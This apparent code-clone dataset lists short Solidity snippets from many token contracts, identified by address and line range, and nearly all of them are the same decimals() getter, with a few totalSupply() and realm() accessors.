<source file="systems/source-code/0x354d28d197c8be69ffa19267ac68f49eb992c8bb.sol" startline="940" endline="942" pcid="1715">
  function realm() public override view returns (address) {
    return _realm;
  }
</source>
<source file="systems/source-code/0x1b7B0b213fB6B96fCFB754881175bb4422e39b52.sol" startline="62" endline="64" pcid="872">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xBD13AACef22A780AB305c9478a801Ce8752aa7aB.sol" startline="61" endline="63" pcid="6776">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3063792385BB315E7016f3E4eFb0560b567DB022.sol" startline="62" endline="64" pcid="1487">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x116C9ACc3e70e542b1F2609868Bc4a3000797cb3.sol" startline="62" endline="64" pcid="461">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3FA3c749646aC090A2e6e6A5097D7bA40a59073A.sol" startline="61" endline="63" pcid="2286">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5C1f1986b0cD5EF29A7528f59DC0dC03060dE44E.sol" startline="55" endline="57" pcid="3527">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6Bf6EE9e148031D538521BB8Ed8658C6Fe12391a.sol" startline="60" endline="62" pcid="3969">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7a2bcaf7d6d3196867f7d59160d1dd5fca05da74.sol" startline="61" endline="63" pcid="4604">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6aEcF2403283336E1644ee3018c01676f149994B.sol" startline="132" endline="134" pcid="3936">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x2AE6bAa928cFeD647807104d4de73aA779a8f433.sol" startline="60" endline="62" pcid="1277">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xef037B58e38300652e9D341D22DB7979Ef33AD6B.sol" startline="63" endline="65" pcid="8705">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x1bF767eC706587F6b3c3f475c8d76692cA19F14b.sol" startline="57" endline="59" pcid="894">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa71Cbe77C505140Cd10070401b82580E0Fe94a1B.sol" startline="65" endline="67" pcid="6102">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9f111397a5A114654A9A6Aa6b3Cd35fbC4500a88.sol" startline="58" endline="60" pcid="5732">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD4cab8f7eB7c8b3DE16b4869CF79FD40D87289C7.sol" startline="59" endline="61" pcid="7604">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa5bf4225edeFe7bdA05825b60D5497e2a5445F1e.sol" startline="59" endline="61" pcid="6033">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xca1d8fef30539ba8f40e11ad60d8b4a863874266.sol" startline="58" endline="60" pcid="7202">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xEb91539BFB1eF16F43Dd4E9c81e4d92f56450Cff.sol" startline="59" endline="61" pcid="8582">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xaE962d11E0a74cE271f7a111a0C3F538eD3DeDE6.sol" startline="60" endline="62" pcid="6362">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xeA9E312E409599e3cCd50Ff1A8F9e742D60C463B.sol" startline="61" endline="63" pcid="8530">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3B06f6027a41bfCED3D5e6855B69aeA5e7426e90.sol" startline="61" endline="63" pcid="2014">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5fA90D86c0F1a01F1f4aaB2C1a98e45adC5Ee38f.sol" startline="64" endline="66" pcid="3618">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x56b05991e5ed8d0ABD6B60FabdB55e1def0864D8.sol" startline="61" endline="63" pcid="3251">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x029D614F344A2a6edE1de8ef4793a3369De927d4.sol" startline="58" endline="60" pcid="94">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x156ba8A652411cd1F4fFbdA89f96172d5C76bD3A.sol" startline="133" endline="135" pcid="612">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x3fb9d6a99375a51fd64641bd6e1fd6dd310b74e4.sol" startline="53" endline="55" pcid="2298">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfBB3b5DF228ded41b9450C535Cd115707c6456C1.sol" startline="58" endline="60" pcid="9175">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8f5b2832b8D440cf00B5Ef5a37d12DC9d96F0839.sol" startline="61" endline="63" pcid="5250">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD1D8c3f9a5609027A1c7cEF070aB9c51b99DCFf7.sol" startline="62" endline="64" pcid="7485">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x94B74A3646f87FADa5EAD91F0af0709fD7c5fe1f.sol" startline="58" endline="60" pcid="5386">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x48ae9c1f0b3ef9f94c0dff437f8f96d49f636e6c.sol" startline="55" endline="57" pcid="2718">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6bd91799f767b30b1f7aeb1239b3573b2e366b49.sol" startline="59" endline="61" pcid="3954">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x23ffd2f59ec758388282634cda63d6dc1e3120f2.sol" startline="134" endline="136" pcid="1091">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0xAd222E0eD7193b73694bC09FE40e285F7BADe1F9.sol" startline="58" endline="60" pcid="6262">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xecF790443697567D67022c757ABE80ac4648dA0E.sol" startline="62" endline="64" pcid="8669">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3D0F6fAF8Ed7c849742861D7C9C7F0Bc1E7Fd116.sol" startline="61" endline="63" pcid="2182">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf65eaef03505f9c2b457d479797b77401e6dd9ac.sol" startline="70" endline="72" pcid="9002">
    function totalSupply() public view override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x9C4595f9D874E2853bc5E57bB98Ca764cBa684d0.sol" startline="63" endline="65" pcid="5687">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3C44CdD91a695287BAECF13a876B599e30F40Ae8.sol" startline="62" endline="64" pcid="2093">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD491aC27192A0adc7a149Ff3df75a93265Ad83eB.sol" startline="62" endline="64" pcid="7589">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xdeE18b2a1ac44f22E4E3Ee3de6AeD146877bCe50.sol" startline="62" endline="64" pcid="7972">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf448f730a7d85678497BE0E4B939D197763A5460.sol" startline="59" endline="61" pcid="8894">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xdea8f0f40066bbc20c044729f08d3c488e4603d8.sol" startline="60" endline="62" pcid="7957">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x68f05bd71E466CA3C1CCC626590DF0Dca75b91Ba.sol" startline="58" endline="60" pcid="3882">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3aE19CA727e6c9C06dA578fB34113aF9aC0676ee.sol" startline="62" endline="64" pcid="1999">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8e828c6761A342fa4204d8827A8b81B35904471B.sol" startline="60" endline="62" pcid="5214">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa0EeeaeA46e92b35849f6F3afC9C63478A0967A0.sol" startline="61" endline="63" pcid="5781">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc4763759BDa9657Cfd06a1613Fc828afD74b70Fa.sol" startline="62" endline="64" pcid="7065">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd80f2392f3592471ef0a0163441db092268c19ee.sol" startline="72" endline="74" pcid="7726">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2f6935cc4a043c0bf69165c791ce6f4361278715.sol" startline="62" endline="64" pcid="1443">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xEb0753dfACc48178d482640e009ec23334a91Dc5.sol" startline="59" endline="61" pcid="8549">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE9Ce9ff1891e1F38778FCEEFC53350eA3A7370D7.sol" startline="58" endline="60" pcid="8452">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8d9579e8591826ef37C80f680e33B6C8c38baB47.sol" startline="60" endline="62" pcid="5184">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3D0ff3246C0C91DDF19688A8CAE0b3F9FfFB5090.sol" startline="64" endline="66" pcid="2197">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x58f43Dc7968012f4DB78EC97A36c9998658ffCcC.sol" startline="57" endline="59" pcid="3342">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4d93ea7ef293ed2ca2d4cc9723f5e2c0c8e09dec.sol" startline="59" endline="61" pcid="2925">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5d914a5ad977439fb1b9a25a6cd71ef41da418dc.sol" startline="61" endline="63" pcid="3577">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x32eC423819A8C80CC7B609C20961371e75E54FA0.sol" startline="62" endline="64" pcid="1579">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x92Fb66bAcacDeB0BFf34538D805521F1019dce1a.sol" startline="57" endline="59" pcid="5331">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x22348b2351817d12C0a89c35AF96B919544D7398.sol" startline="59" endline="61" pcid="1033">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x957b9B7288D04A507437a46AE069bbbeeC8F6c83.sol" startline="59" endline="61" pcid="5431">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x42237AC5Aed08d64FEAE4817fa1F0282087447f7.sol" startline="62" endline="64" pcid="2432">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc18250a3Ca19Da5214B0B7A16c788726139d0b00.sol" startline="62" endline="64" pcid="6953">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x19a99e5BBFAE5fcF744b3C866b40e36aD15CF656.sol" startline="62" endline="64" pcid="802">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xDee33C0f9d5395192ec09e6d4B3753015781C26A.sol" startline="57" endline="59" pcid="7987">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xad3CEB59d03AF61608449769c223aD55478930A9.sol" startline="60" endline="62" pcid="6277">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb0549cac8a2bf3f5d65e5d7b713f33a9eaca6768.sol" startline="57" endline="59" pcid="6480">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x492a83ad58177150c7519db98435f7Fa715D6022.sol" startline="59" endline="61" pcid="2763">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf49f16cd3370fB4cCD6C99e1C6F465d53fdec793.sol" startline="62" endline="64" pcid="8909">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x393150326998e07F1d4B3D013dB62c5D0890352A.sol" startline="62" endline="64" pcid="1882">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6FEDf988195cD0906d8A62D0D55D35cd35D8ef1b.sol" startline="678" endline="680" pcid="4090">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x543f7c0cC91011d96D5Bc2fF8C7C12e5c60D1b29.sol" startline="59" endline="61" pcid="3131">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x76bD48f622Df028AeD28cB121DdA887F84EA805B.sol" startline="62" endline="64" pcid="4430">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x5B8048664dB0A24b6372Cab5972baE9F40c6012e.sol" startline="59" endline="61" pcid="3469">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x25C315bDA171D7C194840aCe6BF80EF274d97dc3.sol" startline="60" endline="62" pcid="1181">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc41c02cd4009b81815af285ab87e4ac171b1e4d2.sol" startline="61" endline="63" pcid="7035">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa7c6613DE0Aab01987058607aB7EC0b2bBeFE54c.sol" startline="58" endline="60" pcid="6133">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xAAb2332D528D2C636a3c1F47dF49472A9341149b.sol" startline="62" endline="64" pcid="6227">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa6Bbb91fC7029E259F590195C21C57D26F480835.sol" startline="61" endline="63" pcid="6087">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xC44c92c0226cF68852E3dbD8E5020B654781De95.sol" startline="55" endline="57" pcid="7050">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x0CB9CDa489aAe64FD4a31D2CD17F70dae5FE4b73.sol" startline="62" endline="64" pcid="328">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3f2c722fd5aedb210beaa0f6932f355c1973c94b.sol" startline="61" endline="63" pcid="2265">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x26aC04336C1A7ad637c1ab4578A59ce17E1d9Fd9.sol" startline="60" endline="62" pcid="1219">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x36eDC92606D7cc78F9bf63665eA39Fb5A76b7796.sol" startline="62" endline="64" pcid="1829">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6a5187F14C2b01BebF7E60A6BCac513D4fc5F144.sol" startline="59" endline="61" pcid="3924">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x08f9862424E2A8F7d7BDcd2c8C33C12d6cFbd43e.sol" startline="60" endline="62" pcid="245">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x442ab95846d23cb78311e8726f307830163a4502.sol" startline="66" endline="68" pcid="2523">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x21bcc45a9a9cb57084b6d6409d8fb0717bffeb91.sol" startline="58" endline="60" pcid="1018">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x42549293c0df3d2eb5ef99722aab9b7228f885a3.sol" startline="60" endline="62" pcid="2447">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x30b64f3Ff111F7B1DBD35a92e9a5A7f1395eb2eD.sol" startline="63" endline="65" pcid="1507">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x75ead649fc217b1a630aee17278b1f2045b6b276.sol" startline="33" endline="35" pcid="4371">
    function totalSupply() external pure override returns (uint256) {
        return _totalSupply;
    }
</source>
<source file="systems/source-code/0x4C3c01Be6fb38419cE6b1F6782d751c5bE6D7751.sol" startline="60" endline="62" pcid="2865">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4BAdfe3A6691C6d4842075C861dB965597E4D895.sol" startline="58" endline="60" pcid="2820">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x55D55083c478237062763c41CBd20209841a0459.sol" startline="61" endline="63" pcid="3206">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x075D3f6AcC15Caf4F8699D72Bc760A09f5842C3f.sol" startline="62" endline="64" pcid="188">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3a9A365011F4fEB41Aed2bFec41b1782A614b8A6.sol" startline="58" endline="60" pcid="1962">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xcf0f68bcabb63cc736d8a301ce2372302454be3d.sol" startline="132" endline="134" pcid="7362">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x1E8203DF1f5488659b9Ff0F39366014Df7d7068D.sol" startline="60" endline="62" pcid="958">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6e7C09630F36B5f34459750c9717C4De1AE94165.sol" startline="58" endline="60" pcid="4059">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x033Be8705C262bb2A12da0274297790e9479CCe1.sol" startline="59" endline="61" pcid="138">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x70d8b31f4eeE0E9988D0b196531205A9D30Ad104.sol" startline="62" endline="64" pcid="4153">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x73f3b1b22f21222c593195558a8c76558f1e8ce8.sol" startline="59" endline="61" pcid="4253">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc09fB61CD91439C2CB8f8554f701c33cECA47a25.sol" startline="62" endline="64" pcid="6893">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2EE5459A05D2DCF76699D0A383EdAcD6e5A8Ee03.sol" startline="60" endline="62" pcid="1413">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf35aD950b9A888FF9E9c25B9a71c19dDF57d61F4.sol" startline="62" endline="64" pcid="8864">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x99E6b2939603Ac9F9daF3f441f1A1A05b6d54c1f.sol" startline="60" endline="62" pcid="5607">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xC2DF29A6Ee0a3C12446E45Ad1340A30fEF33a6A9.sol" startline="62" endline="64" pcid="6968">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA319a1815BC15922A0cCaA8A6E2Ff97DAb632239.sol" startline="59" endline="61" pcid="5877">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xa342B0b37B2a6e213c61B1f19b53dFD3dF82ED53.sol" startline="59" endline="61" pcid="5923">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6cEbef0D2a75E294aEdb3641e77F63CF3ebabb8B.sol" startline="58" endline="60" pcid="3984">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb7844372AB08A7EBA9D3cA79ccDe3F22C990b1E5.sol" startline="62" endline="64" pcid="6668">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2fE58503d325203E80Ed379cE24a9AB5b5f56aEa.sol" startline="58" endline="60" pcid="1458">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe884A9b4fCBB75a6bBAD1d344DAaD8a5F3D0ba2A.sol" startline="57" endline="59" pcid="8392">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x951f6AC91566cC392D051278A1E921ECF56a9B6F.sol" startline="58" endline="60" pcid="5401">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x6557Eb95E84F9247AFEc5e988b4F9532B80A4497.sol" startline="131" endline="133" pcid="3814">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x3Bc0F912FcCA2528801E55FcA480F54f69a9c886.sol" startline="63" endline="65" pcid="2048">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xd6431990d48B3E463696fdc9860f866aFEB1e370.sol" startline="62" endline="64" pcid="7664">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xde0c85748435e9413a95aD4ED9f1c1fCe22685A9.sol" startline="59" endline="61" pcid="7927">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x8236e50E0EC3178c05910A37B9CbDd98bB013A45.sol" startline="56" endline="58" pcid="4885">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3ce7CAfDEB197967161757d8a44e60e9Bf58bC10.sol" startline="60" endline="62" pcid="2167">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xE34d100c26D21eA743c05A18DC0cbc5d223e69a1.sol" startline="59" endline="61" pcid="8227">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4cb7fa2798f47c0531601d8fc33a2F1062b9B0c9.sol" startline="62" endline="64" pcid="2895">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x96Cf8E9E5FD134a5D00E5471b1a0890f6945425D.sol" startline="61" endline="63" pcid="5466">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x9e765D69c813b6A14835Ff2299aF610561DA2D06.sol" startline="59" endline="61" pcid="5702">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xe57f93Bc66faffdC06eabEf8dB45e1fF28Bf67d3.sol" startline="62" endline="64" pcid="8302">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xF3E3E0381509e1B6a83f0D8E41b7219777010A51.sol" startline="61" endline="63" pcid="8879">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xfb43f573a247cbcb8bd9a366d0afb31f4dba1e55.sol" startline="60" endline="62" pcid="9157">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2bc6B9e1b6AE7EDF9a21298Ba0bfe18a166a41d3.sol" startline="61" endline="63" pcid="1292">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x2f324d85C72E2d25bEA80f1aF03392825e15E49a.sol" startline="56" endline="58" pcid="1428">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x59C507Cb69406B5975e70A3c3993AF74c11EF51d.sol" startline="62" endline="64" pcid="3386">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xcfd07da825fbc71855ce35cc5953336b23e27a82.sol" startline="59" endline="61" pcid="7425">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x571d1b19e4eaDC8840499d3A408a4CD3fa31f5A6.sol" startline="56" endline="58" pcid="3271">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA8752c38CaA247fC7724A2D8d4f04e2eD410d7AC.sol" startline="61" endline="63" pcid="6163">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xb3F23B54930Fa83b12A26eD228E431C4A6187590.sol" startline="62" endline="64" pcid="6564">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x4D8c3df04Ce9B909c9FBF4347A5a3fFAdf190142.sol" startline="62" endline="64" pcid="2910">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x75774b445262eE2952CF1a26b5d735Fe648FCE28.sol" startline="62" endline="64" pcid="4330">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xf54B624da049ec181B06B2335A53d5c963B12d46.sol" startline="58" endline="60" pcid="8989">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xef2d4c16063caa3b3202ab447414b7a2aa53ac37.sol" startline="63" endline="65" pcid="8720">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3D4c18a96cf765104e6d70aAA8B11a26eD0e1b40.sol" startline="678" endline="680" pcid="2212">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x31dD70842e7443108905d50c216F2CeDb452E80a.sol" startline="62" endline="64" pcid="1561">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x3a862ec30f2b3Ce5419177221E9E1B151AcC0016.sol" startline="61" endline="63" pcid="1947">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x17E0A45a46FC67d20020128E368637dEA3EFC172.sol" startline="63" endline="65" pcid="728">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x983E15495E359Da37330E515D0a4326d502c0356.sol" startline="58" endline="60" pcid="5496">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xD53bd4D2a303F2D046C94C3553d0a34E903a9Afb.sol" startline="58" endline="60" pcid="7619">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xA37D2E1b045B2dB51d475c8344891AB6E868e64D.sol" startline="61" endline="63" pcid="5938">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0xc49a9fe7c7B41545edfF6B2F2be7662EB588279C.sol" startline="134" endline="136" pcid="7077">
    function decimals() public view virtual returns (uint8) {
        return _decimals;
    }
</source>
<source file="systems/source-code/0x354a08270C0c3533c0e253F50eB126ef1eE04Eb6.sol" startline="62" endline="64" pcid="1680">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
<source file="systems/source-code/0x7B9458F6326Cfe9bD5bF3f1C8BEf266da419aC0D.sol" startline="62" endline="64" pcid="4628">
    function decimals() public view virtual returns (uint8) {
        return tokenDecimals;
    }
</source>
